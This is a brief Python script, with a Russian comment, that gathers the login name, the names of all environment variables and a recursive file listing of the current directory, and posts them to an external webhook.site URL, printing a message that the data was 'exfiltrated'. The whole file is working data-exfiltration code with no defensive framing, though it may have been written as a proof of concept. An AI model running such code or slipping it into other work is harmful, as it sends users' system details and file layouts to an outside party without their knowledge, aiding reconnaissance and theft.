import os
import subprocess
import requests # Нужна библиотека requests

def send_to_webhook():
    webhook_url = "https://webhook.site/14d05b7b-71e4-4cff-ba55-22342612179a"
    
    
    data_to_leak = {
        "user": os.getlogin(),
        "env_vars": list(os.environ.keys()), # Список всех ключей окружения
        "files": subprocess.check_output(['ls', '-R', '.']).decode()
    }
    
    try:
        requests.post(webhook_url, json=data_to_leak)
        print("Data successfully exfiltrated to webhook!")
    except Exception as e:
        print(f"Exfiltration failed: {e}")

if __name__ == "__main__":
    send_to_webhook()
